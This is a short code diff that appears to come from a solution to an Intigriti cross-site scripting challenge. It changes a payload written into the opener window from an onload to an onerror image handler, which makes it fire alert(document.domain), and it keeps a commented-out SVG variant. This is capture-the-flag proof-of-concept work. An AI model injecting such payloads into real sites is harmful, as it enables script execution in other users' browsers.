@@ -10,7 +10,7 @@
 //         var myWindow = window.open(this.contentWindow.name, this.src);
 //         myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
         var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge1.png', '_blank', 'toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400');
-        myWindow.opener.document.write('<img src=x onload=alert(document.domain)>')
+        myWindow.opener.document.write('<img src=x onerror=alert(document.domain)>')
     }
     document.body.appendChild(iframe);
   </script>
